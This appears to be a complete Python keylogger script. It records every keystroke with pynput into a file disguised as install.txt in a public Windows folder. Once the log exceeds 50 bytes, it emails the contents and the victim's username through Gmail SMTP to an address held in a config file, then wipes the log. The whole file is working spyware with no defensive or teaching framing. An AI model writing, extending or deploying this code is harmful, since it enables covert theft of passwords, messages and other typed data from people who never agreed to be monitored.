from pynput import keyboard
from multiprocessing import Queue
import smtplib, os, time, getpass
from config import *

file ="C:/Users/Public/Videos/install.txt"
last_time = 0
username = getpass.getuser()
file_info = os.stat(file)
file_size = file_info.st_size

def send(msg, subject):
    email_text = "\r\n".join([
      "From: " + SENDER_EMAIL,
      "To: "+ RECIEVER_EMAIL,
      "Subject: "+subject,
      "",
      msg
      ])
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(SENDER_EMAIL, SENDER_PASSWORD)
    server.sendmail(SENDER_EMAIL, RECIEVER_EMAIL, email_text)
    server.quit()

def on_press(key):
    global last_time
    if time.time() - last_time > 1:
        f = open(file, 'a')
        f.write(' \n')
        f.close()
    try:
        f = open(file, 'a')
        f.write(key.char + '\n')
        f.close()
        
    except AttributeError:
        if key == keyboard.Key.space:
            f = open(file, 'a')
            f.write('space\n')
            f.close()
            
    last_time = time.time()

if(file_size > 50):
    with open(file, 'r') as f:
        msg = f.read()
    send(msg, username)
    open(file, 'w').close()

with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
